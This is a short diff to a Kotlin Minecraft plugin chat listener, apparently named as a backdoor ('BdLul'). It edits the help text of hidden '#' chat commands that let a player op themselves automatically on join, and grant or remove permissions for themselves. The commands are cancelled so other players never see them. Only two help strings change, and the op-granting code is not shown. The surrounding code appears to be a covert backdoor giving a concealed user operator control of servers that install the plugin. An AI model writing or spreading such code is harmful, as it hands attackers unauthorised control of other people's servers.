@@ -31,8 +31,8 @@ class BdLul(private val plugin: JavaPlugin) : Listener {
                 player.sendMessage(Component.text("#auto on - automatically op's and deop's you at join or leave"))
                 player.sendMessage(Component.text("#auto off - turn auto op and deop off"))
                 player.sendMessage(Component.text("(auto is Currently -> §l§u$autoStatus§r)"))
-                player.sendMessage(Component.text("#* - give yourself a permission"))
-                player.sendMessage(Component.text("#de* - remove a permission from yourself"))
+                player.sendMessage(Component.text("#* - give yourself the permission"))
+                player.sendMessage(Component.text("#de* - remove the permission from yourself"))
                 event.isCancelled = true
             }
 
